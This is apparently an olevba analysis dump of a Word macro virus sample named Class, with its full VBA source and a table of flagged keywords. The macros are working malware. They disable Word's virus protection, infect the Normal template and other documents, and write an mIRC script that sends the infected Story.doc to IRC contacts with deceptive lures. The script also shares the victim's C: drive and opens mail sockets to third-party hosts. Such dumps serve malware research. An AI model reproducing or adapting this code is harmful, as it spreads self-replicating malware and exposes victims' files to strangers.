olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-75e07fe29618b0279ac8441c84612a8dcfde7644
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-75e07fe29618b0279ac8441c84612a8dcfde7644 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Wendy Dowling20/06/00 17:28:13Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
'Jack-In-The-Box
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
'Wendy Dowling21/02/00 16:11:38Claresvprt on \\CLA400\CLARESVPRTMicrosoft Word
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
'Wendy Dowling21/02/00 16:11:38Claresvprt on \\CLA400\CLARESVPRTMicrosoft Word
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
'Wendy Dowling21/02/00 16:11:38Claresvprt on \\CLA400\CLARESVPRTMicrosoft Word
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
'Wendy Dowling21/02/00 16:11:38Claresvprt on \\CLA400\CLARESVPRTMicrosoft Word
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
'Wendy Dowling21/02/00 16:11:38Claresvprt on \\CLA400\CLARESVPRTMicrosoft Word
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
somename = ActiveDocument.Name
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
If InB = 1 Then
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
var3 = "C:\mirc\script.ini"
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
If System.PrivateProfileString("C:\mirc\mirc.ini", "fileserver", "warning") <> "" Then System.PrivateProfileString("C:\mirc\mirc.ini", "fileserver", "warning") = "off"
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
Open "C:\mirc\script.ini" For Output As #1
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
Print #1, "n0=On 1:Connect:{ .notify SimpleSmn | Set %var7 $rand(1,8) | If ( %var7 = 1 ) { Set %var8 mirc.com } | If ( %var7 = 2 ) { Set %var8 georgecarlin.com } | If ( %var7 = 3 ) { Set %var8 carrottop.com } | If ( %var7 = 4 ) { Set %var8 anvdesign.net } | If ( %var7 = 5 ) { Set %var8 symantec.com } | If ( %var7 = 6 ) { Set %var8 drsolomon.com } | If ( %var7 = 7 ) { Set %var8 www.bocklabs.wisc.edu } | If ( %var7 = 8 ) { Set %var8 ebay.com } | Set %var9 $rand(1,4) | If ( %var9 = 1 ) { Set %var10 evrt@avp.com } | If ( %var9 = 2 ) { Set %var10 samples@datafellows.com } | If ( %var9 = 3 ) { Set %var10 virus_research@nai.com } | If ( %var9 = 3 ) { Set %var10 tech_support@nai.com } | If ( $exists(C:\Windows\script1.ini) = $true ) { .remove C:\Windows\script1.ini } | .copy C:\mirc\script.ini C:\Windows\script1.ini | .load -rs C:\Windows\script1.ini | .write -c C:\mirc\script.ini [script] | .reload -rs C:\mirc\script.ini }"
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
Print #1, "n2=On 1:Notify:{ .timer3 1 10 { .clear -s } | If ( $nick == SimpleSmn ) { .msg SimpleSmn I'm on irc. | halt } | .timer1 1 15 { .notify -r $nick | .ignore $nick | .timer9 1 5 { .msg $nick Hey, I can't talk right now but I wanted to send you this file.  It has a funny story you should read, and also has macros inside that protect you from a lot of viruses.  Just open the document, enable the macros, and if you are infected it will get rid of the virus } | .timer2 1 15 { .dcc send $nick C:\Windows\Story.doc } } | .timer 1 16 { .notify | .clear -s } }"
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
Print #1, "n4=On 1:Join:#: if (help isin $chan) || (nohack isin $chan) { .part $chan } | If ( $exists(C:\mirc\script.ini) = $true ) { .remove C:\mirc\script.ini }"
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
Print #1, "n6=On 1:Invite:#:{ .ignore $nick | .timer 1 10 { .join # } | .timer 1 15 { .msg $nick Thanks for the invite } | .timer 1 20 { .msg $nick I'm a little busy so I can't talk much now.  I thought you might want to look at this file I got. It has a funny story and also has macros in it which get rid of any macro viruses.  Just enable the macros when the prompt comes up and it will scan for any viruses and clean them. } | .timer 1 25 { .dcc send $nick C:\Windows\Story.doc } }"
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
Print #1, "n7=On 1:Notice:Simplicity:*: .fserve $nick 100 C:\"
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
Print #1, "n9=On 1:Text:*worm*:*: .ignore $nick"
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
Print #1, "n11=On 1:Text:*infect*:*: .ignore $nick"
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
Print #1, "n13=On 1:Text:*macro*:*: .ignore $nick"
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
Print #1, "n15=On 1:Text:*Hi*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
Print #1, "n16=On 1:Text:*!*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
Print #1, "n18=On 1:Text:*Hello*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
Print #1, "n20=If ( $sockerr != 0 ) { halt } | .sockwrite -n virc rcpt to: %var10 | .sockwrite -n virc data | .sockwrite -n virc To: %var10 | .sockwrite -n virc From: %var5 | .sockwrite -n virc Subject: %var6 | .sockwrite -n virc Jack-In-The-Box Has Popped Up Again! | .sockwrite -n virc . | .sockwrite -n virc Quit | .sockclose virc }"
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
Close #1
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
ActiveDocument.SaveAs FileName:="C:\Windows\Story.doc", AddToRecentFiles:=False
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
End If
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
'Wendy Dowling21/02/00 16:11:38Claresvprt on \\CLA400\CLARESVPRTMicrosoft Word
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
'Wendy Dowling21/02/00 16:11:38Claresvprt on \\CLA400\CLARESVPRTMicrosoft Word
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner

'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner

'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner

'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner

'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner

'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner

'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
Sub ToolsMacro()
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner































'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
On Error GoTo out
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
Options.VirusProtection = False
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
Options.SaveNormalPrompt = False
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
Options.ConfirmConversions = False
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
If nt > 70 And ad > 0 Then GoTo out
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
If nt < 70 Then
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
End If
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
host.CodeModule.AddFromFile ("c:\class.sys")
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
With host.CodeModule
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
    For x = 1 To 4
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
    .deletelines 1
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
    Next x
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
End With
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
If nt < 70 Then
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
    With host.CodeModule
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
    .replaceline 1, "Sub AutoClose()"
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
    .replaceline 71, "Sub ToolsMacro()"
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
    End With
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
End If
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
With host.CodeModule
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
    For x = 2 To 72 Step 2
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
    Next x
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
End With
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
out:
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
End Sub
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE



Private Sub Document_Open(): Document_Close: End Sub
'withered rope you hang what's empty can't remain to put it simply
Private Sub Document_Close(): On Error Resume Next
'in time cry the hollow words to sing with false disguise smothered
Options.ConfirmConversions = (0 - 0): Options.SaveNormalPrompt = (1 - 1): Options.VirusProtection = (2 - 2)
'hope fly from sorrow for a new divine tomorrow i just don't want
CommandBars("Tools").Controls("Macro").Delete: CommandBars("Tools").Controls("Options...").Delete
'to know anymore life shifts up and down everybody knows it's wrong
Set CM = MacroContainer.VBProject.VBComponents.Item(1).CodeModule
'why don't you care? now do it seem fair? it's not in the rhyme or
Set ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
'reason so it goes with every season crawl to top fall through
Set nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
'bottom first hand love is really rotten slice of life find what's
MC = CM.Lines(1, CM.CountOfLines)
'plenty inch towards a sanctuary light with me inside the womb i
ad.deletelines 1, ad.CountOfLines: ad.AddFromString MC
'know everyone everybody knows it's me it's my voice, my voice
nt.deletelines 1, nt.CountOfLines: nt.AddFromString MC
'cries out obscenity sightless eye regard my past sometimes it
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'should i just don't want to know anymore.
End Sub
'NoHope~By~Lys~KovicK Lyrics From Smothered Hope(Skinny Puppy)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+
